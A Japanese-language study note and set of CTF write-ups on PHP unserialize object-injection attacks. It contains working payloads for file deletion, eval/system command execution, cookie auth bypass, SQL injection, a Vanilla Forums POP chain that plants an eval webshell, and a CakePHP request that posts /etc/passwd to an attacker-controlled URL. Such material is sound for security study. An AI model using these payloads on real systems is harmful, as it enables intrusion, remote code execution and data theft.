<!-- START doctoc generated TOC please keep comment here to allow auto update -->
<!-- DON'T EDIT THIS SECTION, INSTEAD RE-RUN doctoc TO UPDATE -->
**Table of Contents**

- [Unserialize](#unserialize)
  - [Serializeの基本](#serialize%E3%81%AE%E5%9F%BA%E6%9C%AC)
  - [__destruct](#__destruct)
  - [__wakeup](#__wakeup)
  - [AuthBypass TypeJuggling](#authbypass-typejuggling)
  - [AuthBypass ObjectReference](#authbypass-objectreference)
  - [POP chain](#pop-chain)
    - [__toString (SQL Injection)](#__tostring-sql-injection)
    - [\_\_destruct (webshell)](#%5C_%5C_destruct-webshell)
- [writeup](#writeup)
  - [\_\_destruct / SQL Injection (websec level04)](#%5C_%5C_destruct--sql-injection-websec-level04)
  - [RCE in PHP Object injetcion (Web 1 Kaspersky Industrial CTF 2018)](#rce-in-php-object-injetcion-web-1-kaspersky-industrial-ctf-2018)
  - [Local File Disclosure / phar:// / file_get_contetns (hitcon2018 baby-cake)](#local-file-disclosure--phar--file_get_contetns-hitcon2018-baby-cake)
  - [phar / file_exists (Berg's Club)](#phar--file_exists-bergs-club)
  - ["phar://" / getimagesize (Vanilla Forums domGetImagesgetimagesize)](#phar--getimagesize-vanilla-forums-domgetimagesgetimagesize)
  - [phar with GIF / %00lambda_1 / file_get_contents (hitcon2017 Baby^H Master PHP 2017)](#phar-with-gif--lambda_1--file_get_contents-hitcon2017-babyh-master-php-2017)
  - [Laravel / encrypt gadget in session with APP_KEY / alias traversal (Forgotten Task)](#laravel--encrypt-gadget-in-session-with-app_key--alias-traversal-forgotten-task)
  - [WordPress < 3.6.1 (is_serialized()) PHP Object Injection](#wordpress--361-is_serialized-php-object-injection)
  - [Vanilla Forums Gdn_Format unserialize() Remote Code Execution Vulnerability](#vanilla-forums-gdn_format-unserialize-remote-code-execution-vulnerability)
  - [Vanilla Forums ImportController index file_exists Unserialize Remote Code Execution](#vanilla-forums-importcontroller-index-file_exists-unserialize-remote-code-execution)
  - [phar / getimagesize / custom gadget (AceBear CTF2019 best band of asia)](#phar--getimagesize--custom-gadget-acebear-ctf2019-best-band-of-asia)
  - [ZendFramework / phpggc (AceBear CTF2019 web 100)](#zendframework--phpggc-acebear-ctf2019-web-100)
  - [](#)
  - [](#-1)
- [参考](#%E5%8F%82%E8%80%83)

<!-- END doctoc generated TOC please keep comment here to allow auto update -->

# Unserialize
## Serializeの基本
```php
<?php
class Example1{
    public $cache_file;
}
class Example2{
    public $cache_file;
    public $array = array("key" => 100);
}

$ex1 = new Example1();
echo serialize($ex1)."\n";  // O:8:"Example1":1:{s:10:"cache_file";N;}
$ex1->cache_file = "index.php";
echo serialize($ex1)."\n";  // O:8:"Example1":1:{s:10:"cache_file";s:9:"index.php";}

$ex2 = new Example2();
echo serialize($ex2)."\n";  // O:8:"Example2":2:{s:10:"cache_file";N;s:5:"array";a:1:{s:3:"key";i:100;}}

// O:8:"Example2":2:{s:10:"cache_file";N;s:5:"array";a:1:{s:3:"key";i:100;}}
// Oは「”Example2”というObjectをシリアル化している」の意味
// 8は”Example2”の文字数
// 2は「フィールドが二つある」の意味
// sはStringの意味？
// 10は"cache_file"の文字数
// Nは値がセットされていないという意味。{変数名;値}でワンセットっぽい
// 最後の"i:100;"はint型の値100という意味
?>
```
## __destruct
```php
class Example1
{
   public $cache_file;

   function __construct(){
      // some PHP code...
   }
   // インスタンス削除時にデストラクタを実行して$cache_fileを削除する
   function __destruct(){
      $file = "/var/www/cache/tmp/{$this->cache_file}";
      if (file_exists($file)) @unlink($file);
   }
}

// some PHP code...

// GETメソッドの?data=以降の値をデシリアライズする
$user_data = unserialize($_GET['data']);

// some PHP code..
```
以下で、Example1クラスのオブジェクトとして復元して、Example1クラスのインスタンスを`$user_data`に代入するので、`$user_data`インスタンスが削除されるときに`../../index.php`が削除されてしまう！   
```txt
http://testsite.com/vuln.php?data=O:8:"Example1":1:{s:10:"cache_file";s:15:"../../index.php";}
```
## __wakeup

```php
<?php 
    class PHPObjectInjection{
        public $inject;
        function __construct(){
        }
        // このクラスをunserializeするときに__wakeup()を実行する
        function __wakeup(){
            if(isset($this->inject)){
                eval($this->inject);  // こんなことする場合ってあるのか？？
            }
        }
    }
    // $_REQUEST['r']はGETとPOSTとCOOKIEを合わせた連想配列。$_GET['r']とかと同じ
    if(isset($_REQUEST['r'])){  
        $var1=unserialize($_REQUEST['r']);
        if(is_array($var1)){
            echo "<br/>".$var1[0]." - ".$var1[1];
        }
    }
    else{
        echo ""; # nothing happens here
    }
?>
```
GETのデータとかCookieのデータとかで`system("whoami")`を実行する。   
```txt
?r=O:18:"PHPObjectInjection":1:{s:6:"inject";s:17:"system('whoami');";}
Cookie: r=O%3A18%3A%22PHPObjectInjection%22%3A1%3A%7Bs%3A6%3A%22inject%22%3Bs%3A17%3A%22system%28%27whoami%27%29%3B%22%3B%7D
```
## AuthBypass TypeJuggling
```php
// 一見、どう見ても安全に見えるが実はがちがちに脆弱。ヤバすぎてワロタ
data = unserialize($_COOKIE['auth']);

// "=="で比較しているため、TypeJugglingにより、 true(boolean) == "admin"(string) はTrueとなるので危険！
if ($data['username'] == $adminName && $data['password'] == $adminPassword) {
    $admin = true;
} else {
    $admin = false;
}
```
以下でAuthBypassのためのPayloadを作成。   
```php
<?php
$data = array("username" => true, "password" => true);
echo serialize($data)."\n"; // a:2:{s:8:"username";b:1;s:8:"password";b:1;}

// "username"のValueの値をBooleanのTrueにするとTypeJugglingによりAuthBypassできる！
echo gettype(true == "admin")." : ".(true == "admin")."\n";  // boolean : 1
echo gettype(true === "admin")." : ".(true === "admin")."\n"; // boolean : 
?>
```
作成した`a:2:{s:8:"username";b:1;s:8:"password";b:1;}`をURL encodeしてCookieにセットすればBypassできる！   
```txt
Cookie: auth=a%3A2%3A%7Bs%3A8%3A%22username%22%3Bb%3A1%3Bs%3A8%3A%22password%22%3Bb%3A1%3B%7D
```
## AuthBypass ObjectReference
```php
<?php
class Object1{
  var $guess;
  var $secretCode;
}

$obj = unserialize($_GET['input']);

if($obj) {
    $obj->secretCode = rand(500000,999999);
    if($obj->guess === $obj->secretCode) {
        echo "Win";
    }
}
?>
```
以下で`$secretCode`と`$code`が同じ値を指すように参照代入したシリアライズデータを作成する。   
```php
<?php
class Object1{
    public $secretCode = "a";
    public $code;
    //public $code = &$secretCode;  // ここでやろうとするとerror。コンストラクタ内でやらないとだめらしい
    public function __construct(){
        // リファレンス(参照)代入。これで$secretCodeと$codeが同じ値を指すようになった！
        $this->code = &$this->secretCode;
    }
}
$obj1 = new Object1();
echo serialize($obj1);  // O:7:"Object1":2:{s:10:"secretCode";s:1:"a";s:4:"code";R:2;}
?>
```
以下で認証を突破できる！   
```txt
?input=O:7:"Object1":2:{s:10:"secretCode";s:1:"a";s:4:"code";R:2;}
```
## POP chain 
### __toString (SQL Injection)
```php
<?php
class Example3{
   protected $obj;

   function __construct(){
      // some PHP code...
   }
   // Exampleクラスのインスタンスが文字列として呼びだされたときに__toString()を実行
   function __toString(){
      if (isset($this->obj)) {
          // $this->objはインスタンスであるとして、そのインスタンスのgetValueメソッドを実行
          return $this->obj->getValue();
      }else{
          return "__toString else";
      }
   }
}

class SQL_Row_Value
{
   private $_table;
   private $id;

   // some PHP code...
   // getValue($id)とすると上の__toString内では引数無しで呼び出してるからエラーになる
   function getValue()
   {
      $sql = "SELECT * FROM {$this->_table} WHERE id = ".(int)$this->id;
      return $sql;
   }
}

// これをデシリアライズすればSQLインジェクションができる！
$user_data = unserialize('O:8:"Example3":1:{s:3:"obj";O:13:"SQL_Row_Value":2:{s:6:"_table";s:10:"users -- -";s:2:"id";i:2;}}');
echo $user_data;

// 実際に実行されるSQLクエリ
// SELECT * FROM users -- - WHERE id = 2
?>
```
以下でPayloadを作成するが、細部がうまいこといってないので手動で修正する。   
```php
<?php
class SQL_Row_Value{
   private $_table ="users -- -";
}

class Example3{
   protected $obj;

   function __construct()   {
      $this->obj = new SQL_Row_Value;
   }
}

print (serialize(new Example3));

// O:8:"Example3":1:{s:6:" * obj";O:13:"SQL_Row_Value":1:{s:21:"SQL_Row_Value_table";s:10:"users -- -";}}
?>
```
### \_\_destruct (webshell)
https://hackerone.com/reports/407552   

以下が最終的なpopchianのコード。   
デシリアライズするとき、`Gdn_Configuration`のインスタンスが作成されてコンストラクタが実行され、`new Gdn_ConfigurationSource()`によって`Gdn_ConfigurationSource`のインスタンスが作成される。   
`Gdn_ConfigurationSource`のインスタンスが作成されるとコンストラクタが実行され、各種フィールドに値がセットされる。   
```php
class Gdn_ConfigurationSource{
    public function __construct(){
        $this->Type = "file";
        $this->Source = "/var/www/html/conf/constants.php";
        $this->Group = 'a=eval($_GET[c]);//';
        $this->Settings[""] = "";       
        $this->Dirty = true;
        $this->ClassName = "Gdn_ConfigurationSource";
    }
}
class Gdn_Configuration {
    public $sources = [];
    public function __construct(){
        $this->sources['si'] = new Gdn_ConfigurationSource();
    }
}
// serialize(new Gdn_Configuration);
```

`Gdn_Configuration`クラスのデストラクタが呼ばれるのがentrypoint。   
[2]でshutdowm()メソッドが呼ばれて[3]が実行される。    
[3]ではshutdown()メソッドの中でshutdown()メソッドが呼ばれてる。これは多分別のクラスのshutdown()メソッドを探すことになるはず？？ここでは別の`Gdn_ConfigurationSource`クラスにあるshutdown()メソッドが該当する。     
上記のpopchainによって、`$source->shutdown(); // 3`の`$source`に`new Gdn_ConfigurationSource()`がセットされ、`インスタンス->shutdown()`となって`Gdn_ConfigurationSource`の`shutdown()`メソッドを実行できる！(実際に実行されるのはデストラクタが呼ばれるとき)   
```php
class Gdn_Configuration extends Gdn_Pluggable {

    ...

    /**
     *
     */
    public function __destruct() {
        if ($this->autoSave) {                      // 1
            $this->shutdown();                      // 2
        }
    }

    /**
     *
     */
    public function shutdown() {
        foreach ($this->sources as $source) {
            $source->shutdown();                    // 3
        }
    }
```
そして以下の`save()`メソッドが実行される。   
[6]のswitchで`$this->Type`の値が`'file'`のとき、[7]で`$group`に`'a=eval($_GET[c]);//'`がセットされる。   
次に[8]で`$options`連想配列に`'VarialbleName'`のValueとして値がセットされる。   
次に[9]で`array_merge()`で別の情報も`$options`に統合される。   
次に[10]で`Gdn_Configuration::format($data, $options)`で`'VarialbleName'`のValueをグローバル変数として設定するらしい。つまり、`$`にValueを追加した`$a=eval($_GET[c]);//`がグローバル変数名として設定される。また、これらをファイルの中身として`$fileContents`に保存する。   
[11]でランダムに作成した`$tmpFile`ファイルに`$fileContents`を書き込む。   
[12]で`$this->Source`にセットされた`"/var/www/html/conf/constants.php"`にファイル名を書き換える。これでWebshellが設置できる！   

```php
class Gdn_ConfigurationSource extends Gdn_Pluggable {

    ...

    /**
     *
     * 
     * @return bool|null
     * @throws Exception
     */
    public function save() {
        if (!$this->Dirty) {
            return null;
        }

        $this->EventArguments['ConfigDirty'] = &$this->Dirty;
        $this->EventArguments['ConfigNoSave'] = false;
        $this->EventArguments['ConfigType'] = $this->Type;
        $this->EventArguments['ConfigSource'] = $this->Source;
        $this->EventArguments['ConfigData'] = $this->Settings;
        $this->fireEvent('BeforeSave');

        if ($this->EventArguments['ConfigNoSave']) {
            $this->Dirty = false;
            return true;
        }

        // Check for and fire callback if one exists
        if ($this->Callback && is_callable($this->Callback)) {
            $callbackOptions = [];
            if (!is_array($this->CallbackOptions)) {
                $this->CallbackOptions = [];
            }

            $callbackOptions = array_merge($callbackOptions, $this->CallbackOptions, [
                'ConfigDirty' => $this->Dirty,
                'ConfigType' => $this->Type,
                'ConfigSource' => $this->Source,
                'ConfigData' => $this->Settings,
                'SourceObject' => $this
            ]);

            $configSaved = call_user_func($this->Callback, $callbackOptions);

            if ($configSaved) {
                $this->Dirty = false;
                return true;
            }
        }

        switch ($this->Type) {                              // 6
            case 'file':
                if (empty($this->Source)) {
                    trigger_error(errorMessage('You must specify a file path to be saved.', 'Configuration', 'Save'), E_USER_ERROR);
                }

                $checkWrite = $this->Source;
                if (!file_exists($checkWrite)) {
                    $checkWrite = dirname($checkWrite);
                }

                if (!is_writable($checkWrite)) {
                    throw new Exception(sprintf(t("Unable to write to config file '%s' when saving."), $this->Source));
                }

                $group = $this->Group;                                                              // 7
                $data = &$this->Settings;
                if ($this->Configuration) {
                    ksort($data, $this->Configuration->getSortFlag());
                }

                // Check for the case when the configuration is the group.
                if (is_array($data) && count($data) == 1 && array_key_exists($group, $data)) {
                    $data = $data[$group];
                }

                // Do a sanity check on the config save.
                if ($this->Source == Gdn::config()->defaultPath()) {
                    // Log root config changes
                    try {
                        $logData = $this->Initial;
                        $logData['_New'] = $this->Settings;
                        LogModel::insert('Edit', 'Configuration', $logData);
                    } catch (Exception $ex) {
                    }

                    if (!isset($data['Database'])) {
                        if ($pm = Gdn::pluginManager()) {
                            $pm->EventArguments['Data'] = $data;
                            $pm->EventArguments['Backtrace'] = debug_backtrace();
                            $pm->fireEvent('ConfigError');
                        }
                        return false;
                    }
                }

                $options = [
                    'VariableName' => $group,                                                   // 8
                    'WrapPHP' => true,
                    'ByLine' => true
                ];

                if ($this->Configuration) {
                    $options = array_merge($options, $this->Configuration->getFormatOptions());             // 9
                }

                // Write config data to string format, ready for saving
                $fileContents = Gdn_Configuration::format($data, $options);                                 // 10

                if ($fileContents === false) {
                    trigger_error(errorMessage('Failed to define configuration file contents.', 'Configuration', 'Save'), E_USER_ERROR);
                }

                // Save to cache if we're into that sort of thing
                $fileKey = sprintf(Gdn_Configuration::CONFIG_FILE_CACHE_KEY, $this->Source);
                if ($this->Configuration && $this->Configuration->caching() && Gdn::cache()->type() == Gdn_Cache::CACHE_TYPE_MEMORY && Gdn::cache()->activeEnabled()) {
                    $cachedConfigData = Gdn::cache()->store($fileKey, $data, [
                        Gdn_Cache::FEATURE_NOPREFIX => true,
                        Gdn_Cache::FEATURE_EXPIRY => 3600
                    ]);
                }

                $tmpFile = tempnam(PATH_CONF, 'config');
                $result = false;
                if (file_put_contents($tmpFile, $fileContents) !== false) {                                 // 11
                    chmod($tmpFile, 0775);
                    $result = rename($tmpFile, $this->Source);                                              // 12
                }
```
実際に設置されたWebshellは以下の感じらしい。   
```txt
steven@pluto:/var/www/html/conf$ cat constants.php 
<?php if (!defined('APPLICATION')) exit();
$a=eval($_GET[c]);//[''] = '';

// Last edited by admin (172.16.175.1)2018-09-08 20:35:19
```
# writeup
## \_\_destruct / SQL Injection (websec level04)
http://websec.fr/  
- **entrypoint**  
User idの`1`を入力するとUsernameの値として`flag`という文字列が表示された。  
`source1.php`,`source2.php`が見れた。  
![image](https://user-images.githubusercontent.com/56021519/104459170-beb4d980-55ef-11eb-9785-5cc21365c4b8.png)  
**source1.php**  
どうみても入力を`unserialize`している箇所が脆弱。  
```php
<?php
include 'connect.php';

$sql = new SQL();
$sql->connect();
$sql->query = 'SELECT username FROM users WHERE id=';


if (isset ($_COOKIE['leet_hax0r'])) {
    $sess_data = unserialize (base64_decode ($_COOKIE['leet_hax0r']));
    try {
        if (is_array($sess_data) && $sess_data['ip'] != $_SERVER['REMOTE_ADDR']) {
            die('CANT HACK US!!!');
        }
    } catch(Exception $e) {
        echo $e;
    }
} else {
    $cookie = base64_encode (serialize (array ( 'ip' => $_SERVER['REMOTE_ADDR']))) ;
    setcookie ('leet_hax0r', $cookie, time () + (86400 * 30));
}

if (isset ($_REQUEST['id']) && is_numeric ($_REQUEST['id'])) {
    try {
        $sql->query .= $_REQUEST['id'];
    } catch(Exception $e) {
        echo ' Invalid query';
    }
}
?>
```
**source2.php**  
以下のSQLクラスを利用してPHP Object Injectionするっぽい。`__construct()`は空っぽなので、`__destruct()`が使えそう。  
デストラクタの中で`execute()`メソッドで`$this->conn->query ($this->query);`のようにして`query`の中のSQL文を実行している。  
したがってここに任意のSQL文をセットした状態でserializeしてからunserializeすればSQL Injectionできそう！  
```php
<?php

class SQL {
    public $query = '';
    public $conn;
    public function __construct() {
    }
    
    public function connect() {
        $this->conn = new SQLite3 ("database.db", SQLITE3_OPEN_READONLY);
    }

    public function SQL_query($query) {
        $this->query = $query;
    }

    public function execute() {
        return $this->conn->query ($this->query);
    }

    public function __destruct() {
        if (!isset ($this->conn)) {
            $this->connect ();
        }
        
        $ret = $this->execute ();
        if (false !== $ret) {    
            while (false !== ($row = $ret->fetchArray (SQLITE3_ASSOC))) {
                echo '<p class="well"><strong>Username:<strong> ' . $row['username'] . '</p>';
            }
        }
    }
}
?>
```
`$row[username]`として`username`カラムの値を要素とした連想配列の値を出力するので、単純に`select password from users`とすると、`$row[username]`で表示できないので、`union select`で結合する。  
```php
$inject = "or";
class SQL {
    public $query = 'SELECT username FROM users WHERE id=-1 union select password from users users2 where id=1';
}

$ex1 = new SQL();
echo serialize($ex1)."\n";
echo base64_encode(serialize($ex1))."\n";

// 出力
// O:3:"SQL":1:{s:5:"query";s:89:"SELECT username FROM users WHERE id=-1 union select password from users users2 where id=1";}
// TzozOiJTUUwiOjE6e3M6NToicXVlcnkiO3M6ODk6IlNFTEVDVCB1c2VybmFtZSBGUk9NIHVzZXJzIFdIRVJFIGlkPS0xIHVuaW9uIHNlbGVjdCBwYXNzd29yZCBmcm9tIHVzZXJzIHVzZXJzMiB3aGVyZSBpZD0xIjt9 
```
これを`$_COOKIE['leet_hax0r']`にセットすると以下のようにFlagをゲット！  
![image](https://user-images.githubusercontent.com/56021519/104460136-08ea8a80-55f1-11eb-8b2d-0901870afec1.png)　　
- **payload**  
```txt
Cookie: leet_hax0r=TzozOiJTUUwiOjE6e3M6NToicXVlcnkiO3M6ODk6IlNFTEVDVCB1c2VybmFtZSBGUk9NIHVzZXJzIFdIRVJFIGlkPS0xIHVuaW9uIHNlbGVjdCBwYXNzd29yZCBmcm9tIHVzZXJzIHVzZXJzMiB3aGVyZSBpZD0xIjt9=
```
## RCE in PHP Object injetcion (Web 1 Kaspersky Industrial CTF 2018)
https://medium.com/@awidardi/web-1-kaspersky-industrial-ctf-2018-95af27db6b2  
- **entrypoint**  
`1+2`とかを計算できるWebサイトがあって、入力すると以下のようなオブジェクトを作成して実行できる。この文字列を表示する機能と文字列を与えてデシリアライズして計算できる機能がある。  
```txt
// 1+2
:10:”Expression”:3:{s:14:” Expression op”;s:3:”sum”;s:18:” Expression params”;a:2:{i:0;d:1;i:1;d:2;}s:9:”stringify”;s:5:”1 + 2";}

// 2/0
O:10:”Expression”:3:{s:14:” Expression op”;s:3:”div”;s:18:” Expression params”;a:2:{i:0;d:2;i:1;d:0;}s:9:”stringify”;s:5:”2 / 0";}
```
ここの、`div`の部分がメソッド名にあたり、`{i:0;d:2;i:1;d:0;}`が引数にあたる。  
なので、`exec`,`ls -al`とかに書き換えればRCEできる！  
以下で`file_get_contents`,`index.php`でソースを表示できる！  
```txt
O:10:”Expression”:3:{s:14:” Expression op”;s:17:”file_get_contents”;s:18:” Expression params”;s:9:”index.php”;s:9:”stringify”;s:5:”2 / 0";}
```
- **payload**  
```txt
O:10:”Expression”:3:{s:14:” Expression op”;s:4:”exec”;s:18:” Expression params”;s:6:”ls -la”;s:9:”stringify”;s:5:”2 / 0";}
```
## Local File Disclosure / phar:// / file_get_contetns (hitcon2018 baby-cake)
https://github.com/PDKT-Team/ctf/tree/master/hitcon2018/baby-cake  
https://github.com/orangetw/My-CTF-Web-Challenges#babyfirst-revenge  
- **entrypoint**  
CAKE PHPで書かれたソースが配布される。  
mainの処理は`src/Controller/PagesController.php`に書かれている。  
`cache_get($key)`の中に`unserialize`があって脆弱性があるっぽいが、その中には`cache_set`で`serialize($response->headers)`でシリアライズした文字列しか入りえないので脆弱ではない。  
`display(...$path)`関数の中の`$response = $this->httpclient($method, $url, $headers, $data);`で`?url=`に指定したURLに`?data`で指定したdataを伴ってアクセスしてくれるらしい。  
つまり、例えばPOSTで`/?url=http://IP&data=test`とアクセスすれば、このWebサーバーが`http://IP`に対して`data=test`をデータとしてPOSTリクエストでアクセスしてくれるっぽい。  
`if ( !in_array($method, ['get', 'post', 'put', 'delete', 'patch']) )`でホワイトリストでプロトコルをチェックしているので、`phar://`みたいにアクセスさせることはできない…  
`$response = $this->httpclient($method, $url, $headers, $data);`で`httpclient`メソッドの中の`new Client()`でCLientインスタンスを作成している。  
したがって次は`vendor/cakephp/cakephp/src/Http/Client.php`を見る。  
```php
<?php

namespace App\Controller;
use Cake\Core\Configure;
use Cake\Http\Client;
use Cake\Http\Exception\ForbiddenException;
use Cake\Http\Exception\NotFoundException;
use Cake\View\Exception\MissingTemplateException;

class DymmyResponse {
    function __construct($headers, $body) {
        $this->headers = $headers;
        $this->body = $body;
    }
}

class PagesController extends AppController {

    private function httpclient($method, $url, $headers, $data) {
        $options = [
            'headers' => $headers, 
            'timeout' => 10
        ];

        $http = new Client();
        return $http->$method($url, $data, $options);
    }

    private function back() {
        return $this->render('pages');
    }

    private function _cache_dir($key){
        $ip = $this->request->getEnv('REMOTE_ADDR');
        $index = sprintf('mycache/%s/%s/', $ip, $key);
        return CACHE . $index;
    }

    private function cache_set($key, $response) {
        $cache_dir = $this->_cache_dir($key);
        if ( !file_exists($cache_dir) ) {
            mkdir($cache_dir, 0700, true);
            file_put_contents($cache_dir . "body.cache", $response->body);
            file_put_contents($cache_dir . "headers.cache", serialize($response->headers));
        }
    }

    private function cache_get($key) {
        $cache_dir = $this->_cache_dir($key);
        if (file_exists($cache_dir)) {
            $body   = file_get_contents($cache_dir . "/body.cache");
            $headers = file_get_contents($cache_dir . "/headers.cache");
            
            $body = "<!-- from cache -->\n" . $body;
            $headers = unserialize($headers);
            return new DymmyResponse($headers, $body);
        } else {
            return null;
        }
    }

    public function display(...$path) {    
        $request  = $this->request;
        $data = $request->getQuery('data');
        $url  = $request->getQuery('url');
        if (strlen($url) == 0) 
            return $this->back();

        $scheme = strtolower( parse_url($url, PHP_URL_SCHEME) );
        if (strlen($scheme) == 0 || !in_array($scheme, ['http', 'https']))
            return $this->back();

        $method = strtolower( $request->getMethod() );
        if ( !in_array($method, ['get', 'post', 'put', 'delete', 'patch']) )
            return $this->back();


        $headers = [];
        foreach ($request->getHeaders() as $key => $value) {
            if (in_array( strtolower($key), ['host', 'connection', 'expect', 'content-length'] ))
                continue;
            if (count($value) == 0)
                continue;

            $headers[$key] = $value[0];
        }

        $key = md5($url);
        if ($method == 'get') {
            $response = $this->cache_get($key);
            if (!$response) {
                $response = $this->httpclient($method, $url, $headers, null);
                $this->cache_set($key, $response);                
            }
        } else {
            $response = $this->httpclient($method, $url, $headers, $data);
        }

        foreach ($response->headers as $key => $value) {
            if (strtolower($key) == 'content-type') {
                $this->response->type(array('type' => $value));
                $this->response->type('type');
                continue;
            }
            $this->response->withHeader($key, $value);
        }

        $this->response->body($response->body);
        return $this->response;
    }
    private function httpclient($method, $url, $headers, $data) {
        $options = [
            'headers' => $headers, 
            'timeout' => 10
        ];

        $http = new Client();
        return $http->$method($url, $data, $options);
    }
}
```
`vendor/cakephp/cakephp/src/Http/Client.php`  
`src/Controller/PagesController.php`の`httpclient`メソッドで、`$http->$method($url, $data, $options);`を実行するが、POSTを指定している場合は`$method`の中身は`post`なので、`$http->post()`が呼び出されることになる。  
`post`メソッドの中では`$this->_doRequest(Request::METHOD_POST, $url, $data, $options);`で`_doRequest`メソッドを実行する。  
この中では`$request = $this->_createRequest(`で`_createRequest`メソッドを実行してその中では`Request`クラスのインスタンスを作成している。  
したがって、次は`vendor/cakephp/cakephp/src/Http/Client/Request.php`の中身をみる。  
```php
    /**
     * Default configuration for the client.
     *
     * @var array
     */
    protected $_defaultConfig = [
        'adapter' => 'Cake\Http\Client\Adapter\Stream',

    ...

    public function __construct($config = [])
    {
        $this->setConfig($config);

        $adapter = $this->_config['adapter'];
        $this->setConfig('adapter', null);
        if (is_string($adapter)) {
            $adapter = new $adapter();
        }
        $this->_adapter = $adapter;


    ...

    /**
     * Do a POST request.
     *
     * @param string $url The url or path you want to request.
     * @param mixed $data The post data you want to send.
     * @param array $options Additional options for the request.
     * @return \Cake\Http\Client\Response
     */
    public function post($url, $data = [], array $options = [])
    {
        $options = $this->_mergeOptions($options);
        $url = $this->buildUrl($url, [], $options);

        return $this->_doRequest(Request::METHOD_POST, $url, $data, $options);
    }

    ...

    /**
     * Helper method for doing non-GET requests.
     *
     * @param string $method HTTP method.
     * @param string $url URL to request.
     * @param mixed $data The request body.
     * @param array $options The options to use. Contains auth, proxy, etc.
     * @return \Cake\Http\Client\Response
     */
    protected function _doRequest($method, $url, $data, $options)
    {
        $request = $this->_createRequest(
            $method,
            $url,
            $data,
            $options
        );

        return $this->send($request, $options);
    }

    ...

    /**
     * Creates a new request object based on the parameters.
     *
     * @param string $method HTTP method name.
     * @param string $url The url including query string.
     * @param mixed $data The request body.
     * @param array $options The options to use. Contains auth, proxy, etc.
     * @return \Cake\Http\Client\Request
     */
    protected function _createRequest($method, $url, $data, $options)
    {
        $headers = isset($options['headers']) ? (array)$options['headers'] : [];
        if (isset($options['type'])) {
            $headers = array_merge($headers, $this->_typeHeaders($options['type']));
        }
        if (is_string($data) && !isset($headers['Content-Type']) && !isset($headers['content-type'])) {
            $headers['Content-Type'] = 'application/x-www-form-urlencoded';
        }

        $request = new Request($url, $method, $headers, $data);

    ...

    }
```
`vendor/cakephp/cakephp/src/Http/Client/Request.php`  
`__construct`で`$this->body($data)`で`?data=`の値を`body`メソッドに引数として与えている。  
`form`メソッドの中では、`if (is_array($body)) {`の中で`?body[test]=aaaa`みたいに値がArrayの場合に`$formData->addMany($body);`で`addMany($body)`を実行する。  
この`addMany`メソッドは`$formData = new FormData();`より`FormData`クラスのメソッドなので、次は`vendor/cakephp/cakephp/src/Http/Client/FormData.php`を見る。  
```php
    /**
     * Constructor
     *
     * Provides backwards compatible defaults for some properties.
     *
     * @param string $url The request URL
     * @param string $method The HTTP method to use.
     * @param array $headers The HTTP headers to set.
     * @param array|string|null $data The request body to use.
     */
    public function __construct($url = '', $method = self::METHOD_GET, array $headers = [], $data = null)
    {
        $this->validateMethod($method);
        $this->method = $method;
        $this->uri = $this->createUri($url);
        $headers += [
            'Connection' => 'close',
            'User-Agent' => 'CakePHP'
        ];
        $this->addHeaders($headers);
        $this->body($data);
    }

    ...

    /**
     * Get/set the body/payload for the message.
     *
     * Array data will be serialized with Cake\Http\FormData,
     * and the content-type will be set.
     *
     * @param string|array|null $body The body for the request. Leave null for get
     * @return mixed Either $this or the body value.
     */
    public function body($body = null)
    {
        if ($body === null) {
            $body = $this->getBody();

            return $body ? $body->__toString() : '';
        }
        if (is_array($body)) {
            $formData = new FormData();
            $formData->addMany($body);
            $this->header('Content-Type', $formData->contentType());
            $body = (string)$formData;
        }
        $stream = new Stream('php://memory', 'rw');
        $stream->write($body);
        $this->stream = $stream;

        return $this;
    }
```
`vendor/cakephp/cakephp/src/Http/Client/FormData.php`  
`addMany`メソッドの中で`?data[test]=aaa`を`$name=test`,`$value=aaa`に分解して`$this->add($name, $value);`で`add`メソッドを実行している。  
`add`メソッドの中では`} elseif (is_string($value) && strlen($value) && $value[0] === '@') {`で`?data[test]=@aaa`みたいに`@`から始まっている場合は`$this->addFile($name, $value);`で`addFile`メソッドを実行する。  
`addFile`メソッドで`$value = substr($value, 1);`で`@`を取り除いて`$content = file_get_contents($value);`でファイルを読みだす。  
つまり、`?url=http://IP&data[test]=@/etc/passwd`とすれば`/etc/passwd`をdataとして`http://IP`にPOSTしてくれる！！！   
これでLocal File Disclosureができる！！！！  
```php
    /**
     * Add a new part to the data.
     *
     * The value for a part can be a string, array, int,
     * float, filehandle, or object implementing __toString()
     *
     * If the $value is an array, multiple parts will be added.
     * Files will be read from their current position and saved in memory.
     *
     * @param string|\Cake\Http\Client\FormData $name The name of the part to add,
     *   or the part data object.
     * @param mixed $value The value for the part.
     * @return $this
     */
    public function add($name, $value = null)
    {
        if (is_array($value)) {
            $this->addRecursive($name, $value);
        } elseif (is_resource($value)) {
            $this->addFile($name, $value);
        } elseif (is_string($value) && strlen($value) && $value[0] === '@') {
            trigger_error(
                'Using the @ syntax for file uploads is not safe and is deprecated. ' .
                'Instead you should use file handles.',
                E_USER_DEPRECATED
            );
            $this->addFile($name, $value);
        } elseif ($name instanceof FormDataPart && $value === null) {
            $this->_hasComplexPart = true;
            $this->_parts[] = $name;
        } else {
            $this->_parts[] = $this->newPart($name, $value);
        }

        return $this;
    }

    /**
     * Add multiple parts at once.
     *
     * Iterates the parameter and adds all the key/values.
     *
     * @param array $data Array of data to add.
     * @return $this
     */
    public function addMany(array $data)
    {
        foreach ($data as $name => $value) {
            $this->add($name, $value);
        }

        return $this;
    }

    /**
     * Add either a file reference (string starting with @)
     * or a file handle.
     *
     * @param string $name The name to use.
     * @param mixed $value Either a string filename, or a filehandle.
     * @return \Cake\Http\Client\FormDataPart
     */
    public function addFile($name, $value)
    {
        $this->_hasFile = true;

        $filename = false;
        $contentType = 'application/octet-stream';
        if (is_resource($value)) {
            $content = stream_get_contents($value);
            if (stream_is_local($value)) {
                $finfo = new finfo(FILEINFO_MIME);
                $metadata = stream_get_meta_data($value);
                $contentType = $finfo->file($metadata['uri']);
                $filename = basename($metadata['uri']);
            }
        } else {
            $finfo = new finfo(FILEINFO_MIME);
            $value = substr($value, 1);
            $filename = basename($value);
            $content = file_get_contents($value);
            $contentType = $finfo->file($value);
        }
        $part = $this->newPart($name, $content);
        $part->type($contentType);
        if ($filename) {
            $part->filename($filename);
        }
        $this->add($part);

        return $part;
    }
```
以下で`/etc/passwd`が得られたらしい。  
```txt
POST http://13.230.134.135/?url=http://IP&data[test]=@/etc/passwd
```

```txt
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
